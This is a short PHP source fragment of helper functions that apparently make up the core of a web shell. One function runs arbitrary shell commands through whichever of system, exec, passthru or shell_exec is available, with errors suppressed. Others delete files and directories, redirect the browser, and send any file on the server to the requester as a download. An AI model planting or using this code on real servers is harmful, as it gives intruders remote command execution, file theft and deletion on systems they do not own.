function lite_delete($dir)
{
if(is_dir($dir)){
    if(!rmdir($dir)){
      $s=scandir($dir);
      foreach ($s as $ss) {
        if(is_file($dir."/".$ss)){
          if(unlink($dir."/".$ss)){
            $rm=rmdir($dir);
          }
        }
        if(is_dir($dir."/".$ss)){
          $rm=rmdir($dir."/".$ss);
          $rm.=rmdir($dir);
        }
      }
  }elseif(is_file($dir)){
    $rm = unlink($dir);
  }
}elseif(is_file($dir))
{
  $rm = unlink($dir);
}
return $rm;
}

function lite_cmd($cmd)
{
 if(function_exists('system')) {     
    @ob_start();    
    @system($cmd);    
    $c = @ob_get_contents();    
    @ob_end_clean();    
    return $c;  
  } elseif(function_exists('exec')) {     
    @exec($cmd,$results);     
    $c = "";    
    foreach($results as $result) {      
      $c .= $result;    
    } return $c;  
  } elseif(function_exists('passthru')) {     
    @ob_start();    
    @passthru($cmd);    
    $c = @ob_get_contents();    
    @ob_end_clean();    
    return $c;  
  } elseif(function_exists('shell_exec')) {     
    $c = @shell_exec($cmd);     
    return $c;  
  } 
}
function lite_redirect($kemana,$apa = 'html')
{
	if($apa == 'html')
	{
		echo "<meta http-equiv='refresh' content='0;url={$kemana}'>";
	}elseif($apa == 'js')
	{
		echo "<script>window.location.href='{$kemana}';</script>";
	}elseif($apa == 'php')
	{
		@ob_start();
		header('location:'.$kemana);
		flush();
	}
}
function lite_download($file)
{
	@ob_clean();
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
